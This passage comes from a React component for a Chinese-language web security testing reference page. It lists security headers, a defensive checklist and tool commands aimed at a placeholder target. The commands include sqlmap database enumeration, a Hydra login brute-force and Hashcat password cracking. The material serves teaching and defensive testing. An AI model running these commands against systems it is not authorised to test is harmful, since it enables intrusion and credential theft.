    { header: "Cross-Origin-Opener-Policy", value: "same-origin", description: "跨源opener策略", help: "防止跨源窗口获取opener引用，隔离浏览上下文" },
    { header: "Cross-Origin-Resource-Policy", value: "same-origin", description: "跨源资源策略", help: "限制其他源加载本站资源，防止Spectre等侧信道攻击" },
  ];

  const tools = [
    { name: "OWASP ZAP", description: "开源Web漏洞扫描器", help: "功能全面的免费安全测试工具，支持主动/被动扫描、模糊测试", command: "docker run -t owasp/zap2docker-stable zap-baseline.py -t https://target.com", category: "扫描器" },
    { name: "Burp Suite", description: "专业渗透测试平台", help: "业界标准的Web安全测试工具，支持代理、扫描、入侵等功能", command: "# GUI工具，需要从portswigger.net下载", category: "扫描器" },
    { name: "Nikto", description: "Web服务器漏洞扫描", help: "快速扫描已知漏洞、配置错误和过时组件", command: "nikto -h https://target.com", category: "扫描器" },
    { name: "SQLMap", description: "自动化SQL注入检测", help: "支持多种数据库的SQL注入检测和利用工具", command: "sqlmap -u 'https://target.com/page?id=1' --dbs --batch", category: "注入" },
    { name: "XSSer", description: "XSS漏洞检测", help: "自动化检测和利用XSS漏洞", command: "xsser -u 'https://target.com/search?q=test'", category: "注入" },
    { name: "Nmap", description: "网络端口扫描", help: "发现开放端口和运行的服务，支持脚本扩展", command: "nmap -sV -sC -A target.com", category: "探测" },
    { name: "Nuclei", description: "模板化漏洞扫描", help: "基于YAML模板的快速漏洞扫描器，社区模板丰富", command: "nuclei -u https://target.com -t cves/ -t vulnerabilities/", category: "扫描器" },
    { name: "Dirsearch", description: "目录和文件枚举", help: "暴力枚举网站目录和文件，发现隐藏资源", command: "dirsearch -u https://target.com -e php,html,js", category: "探测" },
    { name: "Gobuster", description: "目录/子域名枚举", help: "高速目录枚举和DNS子域名爆破工具", command: "gobuster dir -u https://target.com -w /usr/share/wordlists/common.txt", category: "探测" },
    { name: "Subfinder", description: "子域名发现", help: "被动子域名枚举，使用多个数据源", command: "subfinder -d target.com -o subdomains.txt", category: "探测" },
    { name: "testssl.sh", description: "SSL/TLS配置检测", help: "全面检测SSL/TLS配置问题和漏洞", command: "testssl.sh https://target.com", category: "配置" },
    { name: "npm audit", description: "Node.js依赖漏洞检查", help: "扫描package.json中依赖的已知漏洞", command: "npm audit --audit-level=high", category: "依赖" },
    { name: "Snyk", description: "依赖安全扫描", help: "检测开源依赖和容器镜像中的漏洞", command: "snyk test && snyk monitor", category: "依赖" },
    { name: "Trivy", description: "容器安全扫描", help: "扫描容器镜像、文件系统、Git仓库中的漏洞", command: "trivy image your-image:tag", category: "依赖" },
    { name: "Hydra", description: "暴力破解工具", help: "支持多种协议的密码暴力破解", command: "hydra -l admin -P passwords.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", category: "认证" },
    { name: "Hashcat", description: "密码破解", help: "GPU加速的密码哈希破解工具", command: "hashcat -m 0 hashes.txt wordlist.txt", category: "认证" },
  ];

  const checklist = [
    { category: "认证安全", items: [
      { text: "密码复杂度要求", help: "至少8位，包含大小写字母、数字和特殊字符" },
      { text: "账户锁定机制", help: "连续失败5次后锁定账户15分钟" },
      { text: "密码重置安全性", help: "重置链接一次性使用，有效期不超过1小时" },
      { text: "会话管理", help: "Session ID随机生成，登录后重新生成" },
      { text: "多因素认证", help: "敏感操作启用MFA，如支付、密码修改" },
    ]},
    { category: "授权控制", items: [
      { text: "最小权限原则", help: "用户只能访问完成任务所需的最少资源" },
      { text: "RBAC实现", help: "基于角色的访问控制，权限与角色绑定" },
      { text: "API授权检查", help: "每个API端点都验证用户权限" },
      { text: "敏感操作确认", help: "删除、转账等操作需要二次确认" },
    ]},
    { category: "输入验证", items: [
      { text: "服务端验证", help: "永远不信任客户端，所有输入在服务端重新验证" },
      { text: "参数化查询", help: "使用预编译语句防止SQL注入" },
      { text: "输出编码", help: "根据上下文（HTML/JS/URL）正确编码输出" },
      { text: "文件上传限制", help: "验证文件类型、大小，存储在非Web目录" },
    ]},
    { category: "数据保护", items: [
      { text: "传输加密", help: "强制使用TLS 1.2+，HSTS启用" },
      { text: "存储加密", help: "敏感数据AES-256加密，密钥安全管理" },
      { text: "密码哈希", help: "使用bcrypt/argon2，cost factor>=10" },
      { text: "日志脱敏", help: "日志中不记录密码、Token等敏感信息" },
    ]},
  ];

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "critical": return "destructive";
      case "high": return "destructive";
      case "medium": return "secondary";
      default: return "outline";
    }
  };

  const getSeverityText = (severity: string) => {
    switch (severity) {
      case "critical": return "严重";
      case "high": return "高危";
      case "medium": return "中危";
      default: return "低危";
    }
  };

  return (
    <ToolLayout
      title="安全测试参考"
      description="OWASP Top 10、渗透测试Payload、安全工具速查"
      icon={Shield}
    >
      <Tabs defaultValue="owasp" className="w-full">
        <TabsList className="grid w-full grid-cols-5">
          <TabsTrigger value="owasp" className="flex items-center gap-1 text-xs sm:text-sm">
            <AlertTriangle className="h-4 w-4" />
            <span className="hidden sm:inline">OWASP Top 10</span>
            <span className="sm:hidden">OWASP</span>
          </TabsTrigger>
          <TabsTrigger value="payloads" className="flex items-center gap-1 text-xs sm:text-sm">
            <Bug className="h-4 w-4" />
            <span className="hidden sm:inline">测试Payload</span>
            <span className="sm:hidden">Payload</span>
          </TabsTrigger>
          <TabsTrigger value="headers" className="flex items-center gap-1 text-xs sm:text-sm">
            <Lock className="h-4 w-4" />
            <span className="hidden sm:inline">安全响应头</span>
            <span className="sm:hidden">响应头</span>
          </TabsTrigger>
          <TabsTrigger value="tools" className="flex items-center gap-1 text-xs sm:text-sm">
            <Terminal className="h-4 w-4" />
            <span className="hidden sm:inline">安全工具</span>
            <span className="sm:hidden">工具</span>
          </TabsTrigger>
          <TabsTrigger value="checklist" className="flex items-center gap-1 text-xs sm:text-sm">
            <FileText className="h-4 w-4" />
            <span className="hidden sm:inline">检查清单</span>
            <span className="sm:hidden">清单</span>
          </TabsTrigger>
        </TabsList>

        <TabsContent value="owasp" className="mt-6">
          <ScrollArea className="h-[700px]">
            <div className="grid gap-4">
              {owaspTop10.map((item) => (
                <Card key={item.id} className="border-border/50">
                  <CardContent className="p-4">
                    <div className="flex items-start justify-between mb-3">
                      <div className="flex items-center gap-3">
                        <Badge variant="outline" className="font-mono">{item.id}</Badge>
                        <h3 className="font-semibold text-foreground">
                          {item.name}
                          <HelpTip content={item.help} />
                        </h3>
                      </div>
                      <Badge variant={getSeverityColor(item.severity)}>
                        {getSeverityText(item.severity)}
                      </Badge>
                    </div>
                    <p className="text-sm text-muted-foreground mb-3">{item.description}</p>
                    
                    <div className="space-y-1 mb-4">
                      <p className="text-xs font-medium text-muted-foreground">测试要点:</p>
                      <ul className="grid grid-cols-1 md:grid-cols-2 gap-1">
                        {item.tests.map((test, i) => (
                          <li key={i} className="text-sm text-foreground flex items-center gap-2">
                            <span className="w-1.5 h-1.5 rounded-full bg-primary flex-shrink-0" />
                            <span>
                              {test.text}
                              <HelpTip content={test.help} />
                            </span>
                          </li>
                        ))}
                      </ul>
                    </div>

                    {/* 详细测试方案 */}
                    <Collapsible open={openItems.includes(item.id)} onOpenChange={() => toggleItem(item.id)}>
                      <CollapsibleTrigger className="flex items-center gap-2 text-sm font-medium text-primary hover:underline cursor-pointer w-full justify-center py-2 border-t border-border/50">
                        <Target className="h-4 w-4" />
                        查看详细测试方案
                        <ChevronDown className={`h-4 w-4 transition-transform ${openItems.includes(item.id) ? 'rotate-180' : ''}`} />
                      </CollapsibleTrigger>
                      <CollapsibleContent className="mt-4 space-y-4">
                        {/* 测试工具 */}
                        <div className="border border-border/50 rounded-lg p-4 bg-muted/30">
                          <div className="flex items-center gap-2 mb-3">
                            <Wrench className="h-4 w-4 text-primary" />
                            <h4 className="font-semibold text-foreground text-sm">推荐工具</h4>
                          </div>
                          <div className="grid gap-2 md:grid-cols-2">
                            {item.testPlan.tools.map((tool, i) => (
                              <div key={i} className="flex items-start gap-2 text-sm">
                                <Badge variant="outline" className="shrink-0 text-xs">{tool.name}</Badge>
                                <span className="text-muted-foreground">{tool.usage}</span>
                              </div>
                            ))}
                          </div>
                        </div>

                        {/* 测试场景 */}
                        <div className="space-y-3">
                          <div className="flex items-center gap-2">
                            <Play className="h-4 w-4 text-primary" />
                            <h4 className="font-semibold text-foreground text-sm">测试场景</h4>
                          </div>
                          {item.testPlan.scenarios.map((scenario, i) => (
                            <div key={i} className="border border-border/50 rounded-lg p-4 bg-card">
                              <h5 className="font-medium text-foreground mb-2 flex items-center gap-2">
                                <span className="flex items-center justify-center w-5 h-5 rounded-full bg-primary text-primary-foreground text-xs">{i + 1}</span>
                                {scenario.name}
                              </h5>
                              <div className="space-y-3 text-sm">
                                <div>
                                  <p className="text-muted-foreground font-medium mb-1">操作步骤：</p>
                                  <ul className="space-y-0.5 text-foreground">
                                    {scenario.steps.map((step, j) => (
                                      <li key={j} className="pl-2">{step}</li>
                                    ))}
                                  </ul>
                                </div>
                                <div>
                                  <p className="text-muted-foreground font-medium mb-1">预期结果：</p>
                                  <p className="text-green-600 dark:text-green-400 pl-2">{scenario.expected}</p>
                                </div>
                                <div>
                                  <p className="text-muted-foreground font-medium mb-1">测试Payload/示例：</p>
                                  <pre className="p-2 bg-muted rounded text-xs font-mono text-foreground overflow-x-auto whitespace-pre-wrap">
                                    {scenario.payload}
                                  </pre>
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>

                        {/* 检查清单 */}
                        <div className="border border-primary/30 rounded-lg p-4 bg-primary/5">
                          <div className="flex items-center gap-2 mb-3">
                            <CheckSquare className="h-4 w-4 text-primary" />
                            <h4 className="font-semibold text-primary text-sm">测试检查清单</h4>
                          </div>
                          <ul className="grid gap-1 md:grid-cols-2">
                            {item.testPlan.checklist.map((checkItem, i) => (
                              <li key={i} className="text-sm text-foreground flex items-start gap-2">
                                <input type="checkbox" className="mt-1 rounded border-border" />
                                <span>{checkItem}</span>
                              </li>
                            ))}
                          </ul>
                        </div>
                      </CollapsibleContent>
                    </Collapsible>
                  </CardContent>
                </Card>
              ))}
            </div>
          </ScrollArea>
        </TabsContent>

        <TabsContent value="payloads" className="mt-6">
          <ScrollArea className="h-[600px]">
            <div className="grid gap-4">
              {injectionPayloads.map((category) => (
                <Card key={category.type} className="border-border/50">
                  <CardContent className="p-4">
                    <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
                      <Bug className="h-4 w-4 text-primary" />
                      {category.type}
                      <HelpTip content={category.help} />
                    </h3>
                    <div className="grid gap-2">
                      {category.payloads.map((payload, i) => (
                        <div key={i} className="flex items-start gap-2">
                          <code className="flex-1 p-2 bg-muted rounded text-sm font-mono text-foreground break-all">
                            {payload.code}
                          </code>
                          <span className="text-xs text-muted-foreground min-w-[100px] pt-2">
                            {payload.desc}
                          </span>
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </ScrollArea>
        </TabsContent>

        <TabsContent value="headers" className="mt-6">
          <Card className="border-border/50">
            <CardContent className="p-4">
              <div className="overflow-x-auto">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-border">
                      <th className="text-left p-3 font-semibold text-foreground">响应头</th>
                      <th className="text-left p-3 font-semibold text-foreground">推荐值</th>
                      <th className="text-left p-3 font-semibold text-foreground">作用</th>
                    </tr>
                  </thead>
                  <tbody>
                    {securityHeaders.map((item) => (
                      <tr key={item.header} className="border-b border-border/50 hover:bg-muted/50">
                        <td className="p-3">
                          <code className="text-primary font-mono">{item.header}</code>
                          <HelpTip content={item.help} />
                        </td>
                        <td className="p-3">
                          <code className="text-muted-foreground font-mono text-xs">{item.value}</code>
                        </td>
                        <td className="p-3 text-muted-foreground">{item.description}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </CardContent>
          </Card>

          <Card className="border-border/50 mt-4">
            <CardContent className="p-4">
              <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
                Nginx 配置示例
                <HelpTip content="将这些配置添加到nginx.conf的server块中" />
              </h3>
              <pre className="p-4 bg-muted rounded text-sm font-mono text-foreground overflow-x-auto">
{`add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Permissions-Policy "geolocation=(), camera=(), microphone=()" always;

# 隐藏服务器版本信息
server_tokens off;`}
              </pre>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="tools" className="mt-6">
          <ScrollArea className="h-[600px]">
            <div className="space-y-6">
              {['扫描器', '注入', '探测', '配置', '依赖', '认证'].map((cat) => (
                <div key={cat}>
                  <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
                    <Terminal className="h-4 w-4 text-primary" />
                    {cat}工具
                  </h3>
                  <div className="grid gap-3 md:grid-cols-2">
                    {tools.filter(t => t.category === cat).map((tool) => (
                      <Card key={tool.name} className="border-border/50">
                        <CardContent className="p-4">
                          <div className="flex items-center gap-2 mb-2">
                            <h4 className="font-semibold text-foreground">{tool.name}</h4>
                            <HelpTip content={tool.help} />
                          </div>
                          <p className="text-sm text-muted-foreground mb-3">{tool.description}</p>
                          <pre className="p-3 bg-muted rounded text-xs font-mono text-foreground overflow-x-auto">
                            {tool.command}
                          </pre>
                        </CardContent>
                      </Card>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </ScrollArea>
        </TabsContent>

        <TabsContent value="checklist" className="mt-6">
          <ScrollArea className="h-[600px]">
            <div className="grid gap-4 md:grid-cols-2">
              {checklist.map((section) => (
                <Card key={section.category} className="border-border/50">
                  <CardContent className="p-4">
                    <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
                      <Shield className="h-4 w-4 text-primary" />
                      {section.category}
                    </h3>
                    <ul className="space-y-2">
                      {section.items.map((item, i) => (
                        <li key={i} className="flex items-start gap-2 text-sm">
                          <input type="checkbox" className="mt-1 rounded border-border" />
                          <span className="text-foreground">
                            {item.text}
                            <HelpTip content={item.help} />
                          </span>
                        </li>
                      ))}
                    </ul>
                  </CardContent>
                </Card>
              ))}
            </div>
          </ScrollArea>
        </TabsContent>
      </Tabs>
    </ToolLayout>
  );
};

export default SecurityTestingReference;
